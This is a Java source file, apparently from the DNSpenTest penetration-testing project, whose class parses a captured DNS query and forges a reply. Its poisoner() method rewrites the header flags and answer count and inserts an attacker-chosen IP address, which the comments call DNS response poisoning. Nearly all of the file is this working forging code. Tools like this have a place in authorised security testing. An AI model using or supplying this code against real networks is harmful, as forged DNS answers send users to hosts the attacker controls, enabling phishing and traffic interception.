package captive.context;

/**
 * This code is part of DNSpenTest (a project of sourceforge.net) and has been
 * developed by the Project's members.
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 59 Temple
 * Place, Suite 330, Boston, MA 02111-1307 USA
 */
import java.net.DatagramPacket;       
import java.util.StringTokenizer;  

public class AnalizeDNS {
                                                                  
    private DatagramPacket pk_all_in = new DatagramPacket(new byte[512], 512);
    private byte[] payload_IN = new byte[512];
    private byte[] payload_FORGED = new byte[512];
    private byte[] IP_h2h = new byte[4];
    private int lenght = 1;
    private char[] URL_req;
    int c = 0;

    AnalizeDNS(DatagramPacket IN, String IP_H2H) {
        this.pk_all_in = IN;
        payload_IN = pk_all_in.getData();
        int i = 0;
        StringTokenizer strk = new StringTokenizer(IP_H2H, ".");
        while (i != 4) {
            IP_h2h[i] = (byte) Integer.parseInt(strk.nextToken());
            i++;
        }									// IP_h2h now contains the IP address used for poisoning the answer
    }

    public int getpayloadLenght() {
        return lenght;
    }

    public byte[] getpayload_FORGED() {
        return java.util.Arrays.copyOf(payload_FORGED,payload_FORGED.length);
    }

    public String getURL() {
        return String.valueOf(URL_req);
    }

    public void parser() {
        for (int i = 0; i < 512; i++) {
            payload_FORGED[i] = payload_IN[i];
        }
        int id = 0;
        while (id == 0) { 					// search the end of the requested URL String
            if (payload_FORGED[12 + c] == (byte) 0) {
                id = 1;
            } else {
                c++;
            }
        } 									// c is the lenght (in byte) of the requested URL (e.g. "www.google.com" has c=12)
        URL_req = new char[c - 1];
        int a = 0;
        int lc = (int) payload_FORGED[12]; 	// lc is the lenght of the first URL's "token" (e.g. "www" has lc=3)
        int count = 0;
        int flag = 1;
        while (flag != 0) {
            while (a < lc) { 					// extract the token from payload
                URL_req[a + count] = (char) payload_FORGED[a + 13 + count];           
                a++;
            }
            if (a + count == c - 1) { 			// check if the URL's string has ended
                flag = 0;
            } else {
                URL_req[a + count] = '.'; 	// separate the extracted token from the next so to create a well formed http address
            }
            a++;
            count = a + count;
            a = 0;
            lc = payload_FORGED[count + 12]; 	// lc is the lenght of the next token
        }

        //Now AnalizaDNS creates the payload of the poisoned packet changing only a few byte of the original DNS request
    }

    public void poisoner() {			//"lenght" is the payload's lenght */
        poisoner(IP_h2h[0],IP_h2h[1],IP_h2h[2],IP_h2h[3]);
    }        
    public void poisoner(int ip1,int ip2,int ip3,int ip4) {
        c = c + 12;
        payload_FORGED[2] = (byte) 129; 	// Change Flag in 0x8180 (set the first bit to "1" which means "response"
        payload_FORGED[3] = (byte) 128; 	// follows...
        payload_FORGED[6] = (byte) 0; 		// Change Answer_RRs in 0x0001
        payload_FORGED[7] = (byte) 1; 		// follows...
        payload_FORGED[c + 5] = (byte) 192; //write the end of a generic DNS response
        payload_FORGED[c + 6] = (byte) 12;
        payload_FORGED[c + 7] = (byte) 0;
        payload_FORGED[c + 8] = (byte) 1;
        payload_FORGED[c + 9] = (byte) 0;
        payload_FORGED[c + 10] = (byte) 1;
        payload_FORGED[c + 11] = (byte) 0;
        payload_FORGED[c + 12] = (byte) 0;
        payload_FORGED[c + 13] = (byte) 48;
        payload_FORGED[c + 14] = (byte) 33;
        payload_FORGED[c + 15] = (byte) 0;
        payload_FORGED[c + 16] = (byte) 4;
        payload_FORGED[c + 17] = (byte) ip1; // Perform DNS response poisoning...
        payload_FORGED[c + 18] = (byte) ip2;
        payload_FORGED[c + 19] = (byte) ip3;
        payload_FORGED[c + 20] = (byte) ip4;
        lenght = c + 20 + 1; 					//"lenght" is the payload's lenght 
    }
}
